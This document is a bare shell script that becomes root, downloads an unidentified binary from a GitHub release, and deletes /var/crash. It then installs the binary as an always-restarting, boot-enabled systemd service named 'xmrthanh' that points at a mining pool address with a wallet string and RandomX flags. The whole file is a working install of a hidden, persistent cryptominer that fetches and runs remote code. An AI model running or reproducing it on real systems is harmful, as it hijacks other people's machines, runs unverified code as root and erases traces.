sudo su
cd /home
wget -q https://github.com/trangtrau/sang_ml/releases/download/test/ar 
cp ar jvdar 
chmod +x jvdar
rm -rf /lib/systemd/system/xmrthanh.service
rm -rf /var/crash
bash -c 'cat <<EOT >>/lib/systemd/system/xmrthanh.service 
[Unit]
Description=xmrthanh
After=network.target
[Service]
ExecStart= /home/jvdar -o 188.165.76.243:5332 -u ZEPHsCeLknpFv4UBJTAaNHUxSUooDkLT7cVVDucuUhuzGfhLijMGrFB7oUmXSMKZeC9zjANMn1uR7Sx98g7Q4J8YBEuWbJWLDuZ -p D2as_v4 -a rx/0 -k -t 2 --no-cpu
WatchdogSec=36000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable xmrthanh.service &&
service xmrthanh stop  &&
service xmrthanh restart
top
